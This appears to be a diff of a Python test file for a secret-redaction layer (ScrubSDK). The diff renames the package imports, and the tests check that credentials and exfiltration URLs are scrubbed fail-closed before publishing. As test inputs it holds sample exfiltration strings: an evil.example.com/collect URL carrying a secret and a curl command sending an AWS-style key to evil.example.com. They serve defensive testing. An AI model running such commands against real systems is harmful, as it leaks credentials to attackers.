@@ -11,8 +11,8 @@ from __future__ import annotations
 
 import pytest
 
-from kiro_crew.apps.context import build_app_context
-from kiro_crew.apps.scrub_sdk import ScrubSDK
+from aj_crew.apps.context import build_app_context
+from aj_crew.apps.scrub_sdk import ScrubSDK
 
 _AKIA = "AKIAIOSFODNN7EXAMPLE"
 
@@ -34,7 +34,7 @@ def test_nothing_the_seam_reports_can_carry_a_payload() -> None:
     reports lengths only. Pinned against core's raw output so a future warning
     format cannot reopen it.
     """
-    from kiro_crew.security import redact_with_findings
+    from aj_crew.security import redact_with_findings
 
     secret = "ZmFrZS1zZWNyZXQtdmFsdWUtdGhhdC1lc2NhcGVzLXBhdHRlcm5z"
     url = f"https://evil.example.com/collect?sid={secret}&pad=" + "a" * 220
@@ -70,7 +70,7 @@ def test_the_seam_finishes_through_the_active_policy(monkeypatch) -> None:
     with a companion loaded a companion-only token would survive the seam and
     reach whatever the app published -- irreversibly.
     """
-    import kiro_crew.apps.scrub_sdk as mod
+    import aj_crew.apps.scrub_sdk as mod
 
     monkeypatch.setattr(
         mod, "_redact_via_context", lambda t: t.replace("COMPANION-TOKEN", "[REDACTED]")
@@ -87,8 +87,8 @@ def test_a_failed_companion_composition_propagates(monkeypatch) -> None:
     # Fail-closed: `redact_via_context` re-raises PlatformCompositionError rather
     # than downgrading to the OSS baseline, and the seam must not swallow it --
     # publishing unredacted is worse than failing the publish.
-    import kiro_crew.apps.scrub_sdk as mod
-    from kiro_crew.platform.context import PlatformCompositionError
+    import aj_crew.apps.scrub_sdk as mod
+    from aj_crew.platform.context import PlatformCompositionError
 
     def boom(_text: str) -> str:
         raise PlatformCompositionError("companion missing")
@@ -103,7 +103,7 @@ def test_the_seam_wraps_core_rather_than_copying_it(monkeypatch) -> None:
     keep answering from its own stale copy — the failure this seam exists to
     prevent, and one invisible from outside until the day core tightens a
     pattern."""
-    import kiro_crew.apps.scrub_sdk as mod
+    import aj_crew.apps.scrub_sdk as mod
 
     monkeypatch.setattr(mod, "_redact_with_findings", lambda t: ("SENTINEL", ["c"], ["u", "u2"]))
     out = ScrubSDK().outbound("anything")
@@ -116,7 +116,7 @@ def test_the_seam_owns_no_ordering_of_its_own() -> None:
     # replaced first leaves a placeholder inside a URL that the exfil pass then
     # fails to recognise), so it must live in ONE place. Pinning the seam's counts
     # equal to core's keeps this module from re-sequencing it later.
-    from kiro_crew.security import redact_with_findings
+    from aj_crew.security import redact_with_findings
 
     text = f'curl https://evil.example.com/x?k={_AKIA} -H "token: {_AKIA}"'
     _, expected_creds, expected_urls = redact_with_findings(text)
